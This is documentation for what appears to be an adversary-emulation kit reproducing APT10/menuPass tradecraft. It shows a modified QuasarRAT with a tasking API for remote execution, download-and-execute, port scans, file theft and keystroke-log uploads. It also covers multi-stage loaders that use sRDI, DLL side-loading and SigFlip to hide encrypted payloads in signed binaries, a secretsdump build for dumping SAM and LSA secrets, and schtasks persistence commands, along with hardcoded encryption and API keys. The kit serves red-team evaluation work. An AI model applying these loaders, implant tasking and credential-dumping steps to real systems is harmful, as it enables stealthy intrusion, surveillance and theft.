HTTP, perhaps you want to allow users to specify the host/port combination to listen on.","In this guide, we'll use an HTTP C2 handler as a basic example, and we'll call it examplehttphandler. Our config file entry will look as follows:","Note that we set enabled to true so that our handler will start up when the server is run. We'll simply create a file ./config/my_example_handler_config.yml and write those contents in it."]},{"l":"Unit Tests","p":["Don't forget your unit tests! You will need to create unit tests for your new handler and update existing unit tests in handler/handlers_test.go to account for your newly available C2 handler:","The TestStartStopHandlers and TestStartStopHandlersSomeEnabled test functions will need to be updated so that the number of available C2 handlers reflects your newly added handler.","The auxiliary functions mockHandlerConfigFileReaderAllEnabled and mockHandlerConfigFileReaderSomeEnabled will also need to be updated to include dummy entries for your new handler.","When ready, run go test ./... in the main control server repo directory to confirm that all your tests are working."]},{"l":"Recompile binary","p":["Recompile the control server binary to include your new C2 handler and perform any additional testing.","Run go build -o controlServer main.go in the main directory to recompile, and run sudo ./controlServer -c ./config/my_example_handler_config.yml to run the control server using your specific handler configuration settings."]}],[{"l":"Quasar C2 Server Compatibility Handler","p":["This Quasar handler links the ATT&CK Evals C2 server with the standalone Quasar C2 server by MaxXor. Note that the Quasar C2 server has been modified to support compatibility with the Evals C2 server - for more information, please see the modified Quasar C2 server documentation in your Evals repository.","The compatibility between the Evals C2 server and the Quasar C2 server leverages REST API functionality provided by both the Evals C2 server and the modified Quasar C2 server."]},{"l":"Features","p":["Tracks Quasar implant sessions that are actively connected to the Quasar server","Every 15 seconds, gets a list of active Quasar implant connections. New implant connections are logged as new Quasar sessions via the Evals REST API server.","Implant sessions that get disconnected are logged to the Evals C2 server log file.","Can task Quasar implants to do the following:","Execute processes on the local target machine","Perform a port scan for specific ports against a given network range","Download files from the Quasar server (the files must exist on the Quasar server itself)","Upload files to the Quasar server, which the Quasar evals C2 handler will pick up and save locally on the Evals C2 server.","Upload logged keystrokes to the Quasar server"]},{"l":"Tasking","p":["'{seq: 1, type: 1, proc_path: whoami.exe, proc_args: /all}'- the task type code 1 will have the implant execute whoami.exe /all, and the Quasar handler will retrieve the process stdout, stderr, PID, and exit code.","'{seq: 4, type: 1, proc_path: notepad.exe, get_output: false}'- open notepad and only retrieve the PID rather than waiting for process termination","'{type: 5, range: 10.0.2.0/28, ports:[8888, 3389], timeout: 300}'- instruct implant to perform a port scan for ports 8888 and 3389 against the 10.0.2.0/28 network range. The C2 handler will wait 300 seconds (5 minutes) before timing out","{type: 2, transfer_src: ..., transfer_dst: ...}- the task type code 2 will have the implant download the file specified by transfer_src from the Quasar server and save it to the path specified by transfer_dst.","{type: 3, transfer_src: ..., transfer_dst: ...}- the task type code 3 will have the implant upload the file specified by transfer_src to the Quasar server, which will save it locally as the filename specified by transfer_dst. The Quasar c2 handler will grab the uploaded file and save it locally on the evals c2 server machine under the ./files/ subdirectory using the same filename specified by transfer_dst.","{type: 4}- instruct implant to upload its keystroke log files.","1- execute a process","2- download file from Quasar server","3- upload file to Quasar Server","4- upload keystroke logs to Quasar Server for the specified client.","5- perform a port scan against a network range for specific ports","Below are examples of each type code:","download_dst- string indicating where to save the binary downloaded from download_url","download_url- string representing where to download a binary from to execute","Examples of valid tasking:","get_output- boolean indicating whether or not to wait for the process to finish and retrieve stdout and stderr","no_window- boolean indicating whether or not to start the process in a new window. Some processes, like notepad, will create a new window regardless.","ports- int array that specifies which port(s) to scan. Must provide at least one port","proc_args- string representing the arguments to pass","proc_path- string representing the local binary on the target machine to execute","range- IPv4 CIDR string that specifies the target network to scan (e.g. 10.0.2.0/28)","seq- int that represents the task number for the implant. This is for operator usability purposes so operators don't lose track of which commands they ran so far.","Specific fields for general file transfers (task types 2 and 3):","Specific fields for port scan tasks (task type 5):","Specific fields for process execution (task type 1):","The JSON dict can contain the following fields:","timeout- int that represents the timeout in seconds for the Quasar handler to wait for tasks to complete. Default is 120 seconds. The timeout will be rounded up to the nearest multiple of 10. Specifying 0 will use the default value.","transfer_dst- string that represents the destination file for file transfers.","transfer_src- string that represents the source file for file transfers. Required when tasking file downloads or uploads.","type- int that represents the task type (e.g. process execution, file download, file upload)","use_shell- boolean indicating whether or not to execute the process using the OS shell. See Microsoft documentation for more information","You can task Quasar implants by sending requests to the internal REST server using the evalsC2client.py script. The Quasar handler will allow operators to task the following command types using a JSON dict payload format."]},{"l":"Authentication","p":["Under the hood, the Quasar handler will send the expected API key header when making REST API requests. If updating the API key in the Quasar C2 server source code, be sure to update it in the Quasar handler source code and recompile the evals c2 server binary."]},{"l":"Decrypting Client Logs","p":["Since each Quasar client log entry line is AES-encrypted and then base64-encoded, use the decryptquasarlogs.py utility to decrypt client logs:","You will need to install pycryptodome first: pip install pycryptodome"]},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the Quasar handler within the control server, edit the corresponding handler config file within the config/ directory in the main C2 server repo. Create or adjust an existing Quasar handler entry as needed.","Example:","Note that host and port will not point to the address and listening port of the Evals C2 server, but rather to the address and listening port of the Windows server running the Quasar C2 server.","Run the controlServer binary as sudo and look for success messages in starting up the Quasar handler:"]},{"l":"Troubleshooting","p":["The Quasar handler uses the same logging mechanism as other Evals C2 handlers, so refer to the C2 server logs for any indication of errors. However, since Quasar uses a separate server that the Evals C2 handler interacts with to a limited degree, there may be issues between the Quasar server and client that the Quasar C2 handler doesn't have visilibity on. In those instances, refer to the Quasar documentation to inspect logs and troubleshoot some issues.","Below are some potential issues and how to address them:","Suddenly unable to task implant, or implant doesn't seem to be picking up new tasks, even though it is active and executed tasks before","Restart the Quasar server to refresh the connection and then try tasking again"]}],[{"l":"Simple File Server","p":["The Simple File Server Handler allows file downloads and file uploads."]},{"l":"Features","p":["Supports file downloads via HTTP requests to endpoints specified in the handler configuration entry. Multiple URL prefixes are supported.","Supports downloading via curl, certutil.exe, bitsadmin","If no prefixes are provided in the configuration entry, the default will be to serve files from handlers/simplefileserver/files at URL prefix /files","Supports file uploads via HTTP POST request to the /uploads endpoint","Requires sending file content via POST body and file name via filename HTTP header","Prevents directory listing for file endpoints."]},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the Simple File Server handler within the control server, edit the corresponding handler config file within the config/ directory in the main C2 server repo. Create or adjust an existing handler entry as needed.","Example:","for each entry in mappings, prefix specifies the URL prefix for file requests, and dir specifies the path on disk to fetch files from. Subdirectories are automatically supported as long as they exist on disk. Do not add a / at the end of a prefix value.","Run the controlServer binary as sudo and look for success messages in starting up the Simple File Server handler:"]}],[{"l":"Golang Debugging Guide","p":["This guide is a quick overview on how to install and get started with the Golang debugger on VS Code."]},{"l":"Step 1","p":["You will first need to install the Go extension if you have not already. Click on the Extensions icon on the left pane of your window and search 'Go', the needed extension should be the first result. Once you have the Go extension installed, look to the bottom right of your screen on the status bar. If you see â ï¸ Analysis Tools Missing, click on the warning to download the necessary dependencies. If you do not have the warning displayed, you are set to move on to Step 2."]},{"l":"Step 2","p":["You will need to create a launch.json config file. Click on the Debug icon on the left pane of VS Code. You should see the following:","Screenshot 2023-06-27 at 2 42 18 PM","Click on the create a launch.json file link to generate the file. If your Debug panel does not give you this option, you can just create the file manually. Create a new directory entitled .vscode and new file launch.json within it."]},{"l":"Step 3","p":["Configure your launch.json file to reflect the following:","Make sure to update the program and args fields to correctly reflect your filepaths to main.go and your handler config file."]},{"l":"Step 4","p":["Set your breakpoints and then click the green play icon at the top of the Debug panel to start the debugger.","Congratulations! You are now ready to start debugging your Go programs!"]}],[{"l":"Cleanup"},{"l":"Menupass Scenario"},{"l":"Setup","p":["To remove artifacts, run the Cleanup Scripts as from the Kali hosts. You can also run the cleanup scripts on each target as described in their respective directories.","From the Kali Linux machine ( 176.59.17.11):","From the RDP session, open powershell in administrative mode","Run the cleanup commands for each implant listed below that you need to cleanup","Sign out of the RDP session when finished."]},{"l":"SODAMASTER"},{"l":"SIGLOADER"}],[{"l":"FYAnt","p":["FYAnti Diagram","FYAnti is the last loader for MenuPass. It is responsible for executing the final interactive payload, in the case of our scenario, QuasarRat. FYAnti itself is loaded by Sigloader. FYAnti consists of two primary components:","Managed loader","Native loader","Additionally, this project will bundle an encrypted and obfuscated version of the QuasarRat client along with its installation artifacts."]},{"l":"Managed Loader","p":["The managed loader is a C# .NET loader with the following features:","Payload search algorithm","Decryption routine",".NET loader","Logging","The managed loader will search C:\\Windows\\Microsoft.NET for an encrypted payload meeting the configured file size criteria. If it succesfully decrypts a file, it will then use the Load capability of System.Reflection to execute the decrypted memory buffer as a .NET assembly. In production, this payload is an obfuscated and encrypted version of the Quasar client, however during testing the client can be replaced with the included encrypted test assembly. The test assembly simply logs a message to stdout.","Managed loader - Search algorithm - Encrypted file on disk - Obfuscated Quasar client"]},{"l":"Native Loader","p":["The native loader is a C++.NET loader with the following features:","Embedded managed loader","Native CLR host (.NET from C++)","sRDI compatible","The native loader contains an embedded obfuscated version of the managed loader. In order to interop with .NET from C++, it uses Microsoft provided API functions to load the .NET Common Language Runtime (CLR) into the current process. It can then invoke the entrypoint of its embedded .NET managed loader from memory. The native loader is ultimately packaged as an sRDI payload so that it too can be executed from memory.","sRDI - Native loader - Embedded obfuscated managed loader"]},{"i":"build","l":"Build \uD83C\uDFD7ï¸","p":["FYAnti can be built in Debug or Release mode using the included CMakePreset.json configurations."]},{"l":"Dependencies","p":["CMake version 3.26","CMakePresets.json version 6 support (Visual Studio 17.7)"]},{"l":"Quickstart"},{"l":"Command Line","p":["Build both Debug and Release configurations of FYAnti.","For simplicity, all of the generated artifacts can be bundled into the top-level install/ directory using the CMake installation facility.","./install/Release/native-loader.dll.srdi is the production payload for FYAnti. shellcode-runner.exe will inject a copy of native-loader.dll.srdi into itself for independent testing.","Important Bear in mind, release mode FYAnti expects the encrypted client.exe.enc to reside within the C:\\Windows\\Microsoft.NET directory.","The remaining artifacts are simply for debugging and archival purposes. For more information see the Install section"]},{"l":"Build Presets"},{"i":"command-line-1","l":"Command Line"},{"l":"Visual Studio","p":["After selecting the fyanti-release configuration preset: Build - Build All","Build All screenshot"]},{"i":"install","l":"Install \uD83D\uDCE6","p":["Installing FYAnti simply copies all of the artifacts from both Release and Debug builds into the top-level install/ directory. This is simply for ease of use and distributability.","The final product should be a top-level directory named install/ with the following layout:"]},{"l":"Artifacts","p":["client.exe.enc is the encrypted and obfuscated Quasar client","managed-loader.dll is the managed-loader \uD83D\uDE01","net-runner.exe is a test runner which executes the managed-loader independently","embedded.hpp contains the obfuscated managed-loader as a native byte array","native-loader.dll is the native-loader \uD83D\uDE01","dll-runner.exe is a test runner which executes the native-loader independently","native-loader.dll.srdi is an sRDI wrapped version of the native-loader \uD83D\uDE01","shellcode-runner.exe is a test runner which executes the sRDI native-loader payload","test-assembly.dll.enc is a stub payload that replaces the obfuscated and encrypted Quasar client when testing","aes-tool.exe is a .NET utility to encrypt payloads during build and decrypt logs","Confused/ contains ConfuserEx obfuscated version of artifacts","Important There are some differences in the functionality of FYAnti between Release and Debug configurations. Please read the Troubleshoot section for more information."]},{"i":"command-line-2","l":"Command Line"},{"i":"visual-studio-1","l":"Visual Studio","p":["Build - Install FYAnti","Build screenshot"]},{"i":"test","l":"Test \uD83E\uDDEA","p":["The cicd-debug CMake workflow will build and test FYAnti with a single command. This section details how to run tests independently from a build process."]},{"l":"Tools","p":["FYAnti includes runners to test each layer of the final payload independently:","net-runner.exe executes the managed loader by itself to rule out interop issues","dll-runner.exe executes the native loader before it's wrapped with sRDI","shellcode-runner.exe executes the production shellcode version of FYAnti","A test .NET assembly is also included. This assembly has an entrypoint identical to the Quasar client assembly. Addtionally the test assembly is obfuscated and encrypted identically to the Quasar client. If the entrypoint is executed successfully, from a program with accessible stdout, the following message will be logged to the console:","Invoked Quasar.Client.Program.Main from test-assembly","The included tests will verify that each layer of the FYAnti chain can successfully invoke the entrypoint of the test assembly. If all three runners invoke the test assembly without error the build is considered stable.","Warning SigLoader may be sideloaded into a program that does not have a console attached. If that's the case the test assembly message will not be visible. As an alternative rely on the managed loader logs for end-to-end tests."]},{"i":"command-line-3","l":"Command Line"},{"i":"visual-studio-2","l":"Visual Studio","p":["Test - Run test preset for FYAnti - all","Test screenshot","Test Explorer can also be used however test discovery can be unreliable without a fresh build.","Test Explorer screenshot"]},{"i":"troubleshoot","l":"Troubleshoot \uD83E\uDD14"},{"l":"Logs","p":["The managed loader creates an encrypted log file in C:\\Windows\\Microsoft.NET named QLoaderLogs.txt. To view the logs use the included aes-tool.exe to decrypt them to stdout.","Note Debug builds will log to QLoaderLogs.txt in the current working directory. Logs are not encrypted in Debug configurations so they can be read more conveniently."]},{"l":"Test Tools","p":["The included test runners and test assembly can be used to narrow down issues.","Note Debug builds make use of the debug configuration of the managed loader. This debug configuration will search for an encrypted payload in its current working directory first so you don't need to stage a payload in C:\\Windows\\Microsoft.NET."]},{"l":"Debugger","p":["Since FYAnti interops with .NET from C++, it may be useful to configure WinDBG to break on .NET CLR exceptions using the following command:","If a CLR exception is caught you can then view its details:","Note Some CLR exceptions related to failed decryption are expected as the managed loader attempts to search for the encrypted payload.","Important As always, it simpler to debug payloads which are not executed as shellcode because you can wire PDB information into the debugger. So if you end up with a crash check if you can recreate it with the debug configuration of dll-runner.exe first."]},{"i":"cti","l":"CTI \uD83D\uDCC4","p":["Reports","APT10: Tracking down the stealth activity of the A41APT campaign","APT10: sophisticated multi-layered loader Ecipekac discovered in A41APT campaign","Threat Spotlight: menu_pass/QuasarRAT Backdoor"]},{"i":"references","l":"References \uD83D\uDCDD","p":["Description","URL","Load CLR from native process","Arno0x/TestAssembly.cs","ConfuserEx2 .NET obfuscation","https://github.com/mkaring/ConfuserEx"]}],[{"i":"impacket-for-secretsdumpexe","l":"Impacket for secretsdump.exe","p":["This is a slightly modified version of Fortra's Impacket at commit 2de29184dc93247829099fcbc52ff256817c6a94.","The original license can be found here and on the original Github.","The original README can be found here and on the original Github.","The following modifications have been made to the library for compatability in building secretsdump.exe via PyInstaller:","Renamed impacket\\http.py to impacket\\impacket_http.py","Edited impacket\\dcerpc\\v5\\rpch.py import of impacket.http to impacket.impacket_http"]},{"l":"Usage","p":["Command line arguments and usage of the compiled secretsdump.exe is the same as its Python counterpart.","In the menuPass scenario, secretsdump.exe is ingressed and executed by SodaMaster. The following is the executed command line arguments to dump local SAM hashes, cached domain login information, and LSA secrets:"]},{"l":"Build Instructions"},{"l":"Build Environment Setup","p":["The following steps will walk through setup of the build environment.","Open a Command Prompt with administrative privileges to install python (minimum Python 3.12)","From menu_pass/Resources/impacket, create a Python virtual environment","Activate the virtual environment","Install pip (minimum Pip 23.2.1) then use pip to install pyinstaller and impacket","Manually edit pip installed impacket library. This deconflicts with Python's built in HTTP package","Rename impacket-venv\\Lib\\site-packages\\impacket\\http.py to impacket-venv\\Lib\\site-packages\\impacket\\impacket_http.py","Edit impacket-venv\\Lib\\site-packages\\impacket\\dcerpc\\v5\\rpch.py import of impacket.http to impacket.impacket_http","Add C:\\Windows\\system32\\downlevel to PATH to ensure api-ms-win-crt...dll dependencies can be found"]},{"l":"PyInstaller Build Command","p":["Build secretsdump.exe using pyinstaller. This will create a build and a dist directory in the current working directory.","Test execution of secretsdump.exe"]},{"l":"CTI Reporting","p":["PwC - Operation Cloud Hopper: Technical Annex"]}],[{"l":"menuPass Setup Procedure"},{"l":"Infrastructure Configuration","p":["The ALPHV BlackCat and menuPass adversaries share an infrastructure configuration.","See the setup documentation for the ALPHV BlackCat infrastructure setup for guidance on setting up the shared infrastructure configuration."]}],[{"i":"quasar-modified","l":"Quasar (Modified)","p":["Added logging capabilities to the server and implant for troubleshooting (client-side logs are encrypted using AES-256-CBC and hardcoded key)","Added port scan tasking capability to the implant","Added REST API functionality to the server to programmatically manage implants","Adjusted existing IOCs","Assembly information","Batch-script functionality to restart the implant","Client geolocation detection via 3rd-party websites","Client update functionality","Client website-visiting functionality","Credential access from browsers and other password stores","Error-handling approach to automatically restart the implant via batch script","File names and paths","Other setting/configuration info","Removed components that were not needed or used in the evaluation, to make the client more lightweight and reduce chances of detection:","Several modifications have been made, including the following:","The original license can be found here and on the original Github.","The original README can be found on the original Github.","This modified fork of Quasar builds on the existing Quasar C2 framework by MaxXor."]},{"i":"quasar-clientimplant","l":"Quasar Client/Implant"},{"l":"Features","p":["When starting up, the client will automatically do the following:","perform several discovery procedures","start logging keystrokes","connect to the C2 server","The C2 server and other configuration settings are compiled into the implant binary, meaning that any changes will require the user to compile a new implant binary.","Each implant is associated with a unique ID, which is calculated by taking the MD5 hash of the target hostname + target username + the target user account type.","Since each implant checks for a hardcoded mutex to avoid duplicate implant sessions, you will need to rebuild an implant with a different mutex value if you want to have multiple implant sessions running simultaneously on a given machine."]},{"l":"Usage","p":["To run the Quasar implant manually, you can simply run the implant binary:"]},{"l":"Troubleshooting and Logging","p":["Currently, the implant writes to a log file clientmanagement.log in its current working directory. In debug mode, the log entries are in plaintext. In release mode, Each log entry is a base64-encoded encrypted message. AES-256-CBC encryption is used with a hardcoded key: cc4acde9286d68e6a540c93576d2169106d8affda5123f3dfbdf9eb2fd3278e6. To decrypt the logs, please use the Evals c2 server utility python script decryptquasarlogs.py:","Here are some potential problems that you may run into with either the Quasar server or client, and how you can go about troubleshooting them:","Can't start a client process","Check the logs to see at what point the client process terminates. Note that only one instance of a Quasar client can run on a target machine at a time, since Quasar checks for the global mutex.","Client won't connect to the C2 server","Check for any error messages in the log file, and ensure your client settings are set to connect to the correct server and that the certificate information is correct.","Connection seems to hang between Quasar server and client","If your client process is alive, but you can't seem to task it via API, try restarting the Quasar server so the connection can reset.","In the log file output, try searching for disconnect to get an idea of the root cause."]},{"l":"Encryption","p":["Quasar client settings are encrypted and authenticated using AES-256-CBC and SHA256 HMAC. The ENCRYPTIONKEY setting value is used as a passphrase to derive the AES and HMAC keys via PBKDF2 (50000 iterations, SHA256 hashing function, salt value b0a0f82bbff1d2b5dab062a0bfe4312e3d9efaf34cd929292bc2a93d323b09ef). Currently, the setting value of D088E59E5C03F101FFC97A8469FE5C6E3C3380EC will generate the following keys:","AES: 1767c472eb822fb4e012fa605a6b546389a04a4997121f4189d307fb64e94eba","HMAC auth: f7a6d3cf948610539b9991fccd858ac1a74c482e56c2c373c72157d2e4c1494de58cc18439f2dde0c3f293188072fe3f831e16ddb0d768621bba1b1705ec9f42","String literal setting values in Quasar.Client/Config/Settings.cs are base64-encoded ciphertext blobs: HMAC(IV + ciphertext) + IV + ciphertext. These values are decoded and decrypted when the client starts up. Note that since these values are hardcoded, changing settings will require re-encrypting and regenerating HMAC hashes. You may use the config_enc_util.py utility to generate these (Note: recommended to run this script on Linux to avoid quote issues on Windows.)","Usage:","Example:"]},{"l":"Build","p":["Built using Visual Studio and .NET 4.7.2."]},{"l":"Quasar Server"},{"i":"usage-1","l":"Usage","p":["To run the Quasar Server, provide the path to the certificate file as well as the IP address for the REST API server to bind to:","By default, the REST API server will bind to all interfaces and listen on port 8888. If no certificate file path is provided, the Quasar Server will attempt to read the quasar.p12 file from the same directory as the Quasar.exe binary.","For example:"]},{"l":"Logging","p":["Server logs are written in plaintext to QuasarServerLogs.txt in the server's current working directory."]},{"l":"REST API Functionality","p":["The Quasar C2 server REST API was designed to be compatible with the existing Evals C2 server framework - users can use the corresponding Evals C2 handler to track and manage Quasar implant sessions. Typically, users will not need to make raw API requests, as the Evals C2 handler will take care of those under the hood. Most use cases will be satisfied by using the existing evalsC2client.py script.","The REST API server will listen on port 8888 by default.","Files that the Quasar implant uploads to the Quasar server via API tasking will be stored in the uploads folder in the Quasar server's current working directory.","The following endpoints and features are supported:"]},{"l":"View Existing Session Information","p":["GET /api/beacons- fetch a JSON list of active Quasar implant sessions. The return format for a Quasar implant session dictionary is as follows:","id: the implant's unique ID","username: username of the user that the implant is running under","hostname: hostname of the machine on which the implant is running","ip_addr: IP address of the machine on which the implant is running","os: target machine operating system","account_type: account type of the implant user. Possible values: Admin, User, Guest","tag: implant tag for categorization purposes","country_code: country code of the target machine","hardware_id: hardware ID of the target machine","Example:"]},{"l":"Task Implants","p":["GET /api/tasks/{task_id}- Fetch a JSON dictionary containing information for the Quasar implant task pertaining to the given task_id. The response dictionary format varies depending on the type of task, but they will always contain the following fields:","task_id: string representing the task ID","task_type: int representing the task type (e.g. 1 for process creation)","task_status: int representing the task status","0 means that the task was carried out successfully","1 means the task errored out","2 means that the task is pending","task_status_msg: string providing extra details on task_status, such as an error message for a task_status of 2.","POST /api/tasks- create a task (non-file transfer. For file transfers, use the /api/transfers endpoint) for the implant to execute, such as creating a process. Requires POST data consisting of a JSON dictionary with the following fields:","client_id: string containing the ID of the Quasar implant to task","task_type: int representing the type of the task to execute.","1 for process creation","5 to initiate a port scan","The remaining fields depend on the type of task to perform."]},{"l":"Process Creation Tasks","p":["For process creation tasks ( task_type of 1), include the following fields in the POST JSON dictionary:","proc_path: (optional) string containing path to the binary to execute. If ommitted, download_url and download_dst will be used to determine which file to execute.","proc_args: (optional) string containing the process arguments. Multiple arguments must be combined into a single string, such as /flag word1 word2","download_url: (optional) URL string pointing to the file to download and execute with proc_args, if provided. If download_dst is provided, the file will be saved to that path, otherwise a random name is selected with an .exe extension. This field is only required if proc_path is not provided.","download_dst: (optional) filepath string indicating where to save the file downloaded from download_url","use_shell: (optional) boolean indicating whether or not to use the operating system shell to start the process. Default is false. For more information, please refer to the Microsoft documentation","get_output: (optional) boolean indicating whether or not to wait for the implant to wait for the process to complete and send stdout/stderr to the server. Default is true. Cannot be enabled if use_shell is also set to true - the server will set get_output to false if both are enabled. Note that the implant will wait for process completion in a separate thread in order to handle multiple tasks in parallel.","no_window: (optional) boolean indicating whether or not to start the process in a new window. Default is true. Note that some processes, such as notepad.exe will appear in a new window regardless. Mainly used to prevent command-line executables such as hostname.exe from briefly flashing a new window on execution.","For GET /api/tasks/{task_id} requests pertaining to a process creation task, the response dictionary will contain the following fields in addition to the base response fields and the fields/values from the request dictionary:","pid: int representing the process ID of the created process. Will be -1 if the task hasn't yet completed, since the implant sends this information to the C2 server.","exit_code: int representing the exit code of the created process. Will be -1 if the process hasn't yet finished. Only populated if get_output was set to true.","stdout: string representing the standard output of the process. Will be empty if the process hasn't yet finished. Only populated if get_output was set to true.","stderr: string representing the standard error of the process. Will be empty if the process hasn't yet finished. Only populated if get_output was set to true.","Examples:"]},{"l":"Port Scan Tasks","p":["For port scan tasks ( task_type of 5), include the following fields in the POST JSON dictionary:","range: string containing a valid CIDR range (e.g. 10.1.2.0/24) to scan","ports: int array containing the ports to scan the target range for","For GET /api/tasks/{task_id} requests pertaining to a process creation task, the response dictionary will contain the following fields in addition to the base response fields and the fields/values from the request dictionary:","range: CIDR string for the scanned network","ports: int array containing the scanned ports","result: dictionary mapping IP address string to int array of open ports based on the provided target ports to scan.","Examples:"]},{"l":"File Downloads and Uploads","p":["0: completed successfully","1: ran into an error","2: pending","3: canceled","client_id: string containing the ID of the Quasar implant to task","dest: string representing the filepath or filename to save the file as. If performing a server-to-client transfer, the file will be saved using the specified filepath on the target machine where the implant is running. If performing a client-to-server transfer, the file will be saved using the specified filename in the uploads subdirectory of the Quasar server's current working directory. Optional for client-to-server transfers - if not provided, it will take the filename based on the source filepath.","Examples:","GET /api/transfers- fetch a JSON list of all file transfers throughout the Quasar server session. The return format for a Quasar file transfer dictionary is as follows:","GET /api/transfers/{transfer_id}- fetch a JSON dictionary containing information for the Quasar file transfer pertaining to the given transfer_id","GET /api/uploadedfiles- fetch a JSON dictionary mapping file upload transfer IDs to the saved file path on the Quasar server","GET /api/uploadedfiles/{transfer_id}- request the uploaded file pertaining to the given transfer_id","id: the transfer's unique ID","local_path: file source path","POST /api/transfers- create a file transfer task by POSTing a JSON dictionary with the following fields:","remote_path: file destination path","size: size, in bytes, of file transferred.","source: string representing the path of the source file to transfer. If performing a server-to-client transfer, this path must be a valid path on the Quasar server. If performing a client-to-server transfer, this path must exist on the target machine where the implant is running.","status_msg: Status message for the file transfer (e.g. Completed)","status: integer status code for the file transfer:","transferred_size: number of bytes transferred so far","type: int representing the transfer type. 0 for server-to-client, 1 for client-to-server","type: transfer type. 0 for server-to-client, 1 for client-to-server"]},{"l":"Keystroke Log Uploads","p":["0: completed successfully","1: ran into an error","2: pending","3: canceled","4: partial success (some logs failed to upload)","5: pending incomplete (unable to generate file transfers for some log files, other log files still in progress)","client_id: string containing the ID of the Quasar implant to task","Examples:","GET /api/transfers/keylogger/{task_id}- returns a JSON dictionary containing information on the keystroke log upload task with ID task_id. The dictionary will contain the following fields:","POST /api/transfers/keylogger- create a file transfer task by POSTing a JSON dictionary with the following fields:","status_err_msg: Status error message providing more context on non-success error codes.","status_msg: Status message for the upload task (e.g. Successfully retrieved all logs)","status: integer status code for the upload task:","task_id: Task ID string","transfer_ids: list of integers representing the file transfer IDs for the keystroke log files being uploaded. These can be queried via GET /api/transfers/{transfer_id} for individual transfer information.","While /api/transfers is for generic file uploads and downloads, you can use the /api/transfers/keylogger endpoint to manage keystroke log uploads, which is a special type of file upload task for QuasarRat. The Quasar server will task the Quasar client to enumerate all files within its keystroke log directory, and the Quasar server will then generate individual file transfer tasks for each of those keystroke log files. Keystroke log files are uploaded to the uploads/logged_keystrokes/{client_id} subdirectory of the Quasar server's current working directory, where client_id is the ID string of the client that uploaded the files. For instance, keystroke log uploads for client 5CEF61CF22ACA6F40918643E3AAA0772 will go to uploads\\logged_keystrokes\\5CEF61CF22ACA6F40918643E3AAA0772."]},{"l":"Authentication","p":["All REST API requests must have an APIKEY header with the following API key string value: 81152cc4c24d327f8fe800afbfb9777c. Incorrect or missing API keys will result in a 401 Unauthorized. response from the REST API server. This authentication method is set to prevent other parties from sending queries to the Quasar REST API server to obtain information on red team activity.","Example curl commands with the API key:"]},{"i":"build-1","l":"Build","p":["Built using Msbuild and .NET 4.7.2 (use release configuration for static builds):"]}],[{"l":"SigLoader Capability","p":["SigLoader Diagram","The SigLoader cabability uses both DLL side-loading and reflective DLL loading to install fileless malware on a system by deploying it into memory. It first uses a legitimate DLL to side-load the first loader file. This file then extracts data from the end of another DLL that has been modified in a way that keeps it's signature vaild. It then loads the next loader into memory. This process is repeated once more for the third loader. The third loader, depending on the setup, will either deploy FYAnti or SodaMaster by loading them into memory.","Each time we load something into memory, we will be using sRDI."]},{"l":"Building payloads","p":["A powershell script has been included to convert a dll into shellcode using sRDI. By default the script will output a text file with the shelcode as a string. It also provides the ability to create a formated cpp array of the shellcode for testing purposes.","When compiling payloads to be run via dll side-loading, ensure that you are using the 'Release' flag in cmake. It will not work if compiled as 'Debug'.","Run from SigLoader folder:","Building SigLoader for SodaMaster and FYAnti","The build_sigloader.ps1 file will generate each section needed to run Sodamaster, this includes compiling the loaders and appending them to a DLL","Check the variables at the top of the build_sigloader.ps1 script and update them accordingly using your filenames and paths.","If the Sodamaster DLL or FYAnti shellcode are missing from the payload directory, that build will be skipped","Output files will be placed in their respective subdirectories","Running the script",".\\build_sigloader.ps1","Generating just the shellcode","Generating shellcode string",".\\util\\build_shellcode.ps1 -dllPath C:\\Path\\To\\DLL.dll -funcName ExportedFunctionName -outFileName payload","Generating a cpp array for testing",".\\util\\build_shellcode.ps1 -dllPath C:\\Path\\To\\DLL.dll -funcName ExportedFunctionName -outFileName payload -cpp $True"]},{"l":"Layer 1 loader","p":["The layer 1 loader is the only one that uses dll side-loading to execute its payload. After deciding on the executable/dll to use, we need to set up proxy commands to forward the appropriate calls to the correct dll. A variety of tools can be used to extract the exported functions, additionally for dlls' stored in 'System32' there is a github repository that includes all of the proxy commands ( here). Copy these lines to the top of the layer 1 loader, and then the loader code is called when the dll is loaded in memory.","Currently we are using Notepad++.exe and VERSION.dll for loading our implant.","After appending the payload to the Layer 2 loader, update the CMake file with the payload size. Leave the keys and ancryption order used for SigFlip the same."]},{"l":"SigFlip","p":["A tool used to append data to the end of a signed binary while keeping the digital signature valid.","The tool has been modified to allow for the use of AES-CBC, DES, and XOR encryption of the payload before being added to the file. The order of this encryption can be specified by editing the list in the code and then re-compiling it.","A generated diff file for both the SigFlip.cpp and Helper.cpp can be found in the util directory."]},{"l":"Cleaning strings from layer1","p":["Currently there are some debug lines that are added to the layer1 executable from cryptopp. These lines include the filepath to the user who compiled the program, so they need to be removed.","Open layer1.dll in HexD","Use the Find tool to search for your username","When found, highlight the entire filepath that you want removed (in either the hex or ascii portion, both work)","Select Edit - Fill Selection","Select the Zerobytes option from the pop-up and close the window","Search the rest of the file for your username and repeat the above steps"]},{"l":"Use","p":["Compile the binary using CMake","In the CMake file update the variables to set the encryption order and keys","Create a text file with the data you want to embed","For test purposes, named test.txt","Run the binary with the -i flag","sigflip.exe -i C:\\\\Path\\\\To\\Signed\\\\Binary.dll .\\\\test.txt .\\\\modified_binary.dll","sigflip.exe -i C:\\\\Windows\\\\System32\\\\kernel32.dll .\\\\test.txt .\\\\modified_kernel32.dll","Right click the new dll and confirm the signature is valid","Take note of the payload size that is outputted from sigflip. This value needs to be added to the CMake file to compile the loader."]},{"l":"Deploying","p":["SigLoader and payload components will be staged in the payloads folder for use with the evalsC2server's Simple File Server.","These components will eventually be downloaded to victim machines using the certutil utility."]},{"l":"Using Scheduled Task","p":["A schedlued task is created to automatically run the executable that loads SigLoader. The task can be generated for either a domain admin or System.","Deleting the Scheduled Task","Domain Admin","Locally:","Open an administrative shell to run the following commands:","Remotely","Run From DC to Remote Server","schtasks /create /sc minute /mo 15 /tn Notepad++ Script /tr C:\\Program Files\\Notepad++\\notepad++.exe /rl HIGHEST","schtasks /create /sc minute /mo 15 /tn Notepad++ Script /tr C:\\Program Files\\Notepad++\\notepad++.exe /rl HIGHEST /ru System","schtasks /create /sc minute /mo how often to run /tn Name of Task /tr Path to Executable /rl Privilege Level","schtasks /create /sc minute /mo how often to run /tn Name of Task /tr Path to Executable /rl Privilege Level /ru System","schtasks /create /sc minute /mo how often to run /tn Name of Task /tr Path to Executable /rl 